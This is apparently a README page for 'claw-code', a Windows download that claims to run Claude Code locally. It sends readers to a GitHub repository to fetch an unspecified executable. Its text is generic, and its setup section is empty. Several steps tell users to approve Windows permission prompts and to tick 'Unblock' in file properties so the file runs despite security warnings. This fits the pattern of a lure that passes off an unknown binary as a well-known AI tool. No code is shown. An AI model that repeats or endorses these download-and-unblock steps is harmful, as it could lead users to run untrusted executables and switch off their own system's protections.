# 🤖 claw-code - Run Claude Code Locally

[⬇️ Download / Visit the project page](https://github.com/Randravishing966/claw-code)

## 🧭 What this is

claw-code is a desktop-friendly command line app for running Claude Code in a local build. It gives you a single place to open a terminal-style interface, enter tasks, and work with the app on Windows.

This build is set up for end users who want a simple way to get the app from GitHub and start it on their PC.

## 📦 What you need

Before you start, check that your PC has:

- Windows 10 or Windows 11
- A modern web browser
- At least 4 GB of RAM
- 500 MB of free disk space
- An internet connection for the initial download

If your PC can run recent Windows apps, it should work well with this build.

## 🚀 Download and install

1. Open the project page:
   [https://github.com/Randravishing966/claw-code](https://github.com/Randravishing966/claw-code)

2. On the page, look for the latest release or the main download files.

3. Download the Windows build file or the package provided in the repository.

4. If the download comes as a `.zip` file, right-click it and choose **Extract All**.

5. Open the extracted folder.

6. Find the app file or launch file, then double-click it to start.

7. If Windows asks for permission, choose **Run** or **Yes**.

## 🖥️ How to run it on Windows

After you download and open the files:

1. Go to the folder where you extracted the app.
2. Look for the main program file.
3. Double-click the file to launch the app.
4. Wait for the window to open.
5. Follow the on-screen prompts inside the app.

If the app opens in a terminal window, keep that window open while you use it.

## 🧩 First-time setup

## ✨ What you can do with it

claw-code is meant for simple local use and guided command line work. You can use it to:

- Open a chat-style CLI window
- Run task-driven prompts
- Work through step-by-step commands
- Keep your work in one place
- Use a local build instead of a full web app

It is built to feel like a focused tool, not a full desktop suite.

## 🧷 Basic use

Once the app is open:

1. Type your request in the input area.
2. Press Enter.
3. Read the response on screen.
4. Continue with the next step or command.
5. Close the app when you are done.

If you are not sure what to type, start with a short task like:

- Summarize this file
- Help me write a note
- Explain this step
- List the next actions

## 🛠️ Common Windows issues

### 🔒 Windows blocks the file

If Windows shows a security prompt:

1. Right-click the file.
2. Choose **Properties**.
3. Check **Unblock** if you see it.
4. Click **Apply**.
5. Open the file again.

### 🗂️ The app does not start

Try these steps:

1. Make sure you extracted the full download.
2. Open the correct folder.
3. Run the main file, not a text file or folder.
4. Restart Windows.
5. Try again.

### 🌐 The app cannot finish setup

Check these items:

- Your internet connection is active
- The app has permission to use the network
- You entered the right setup details
- The download finished without errors
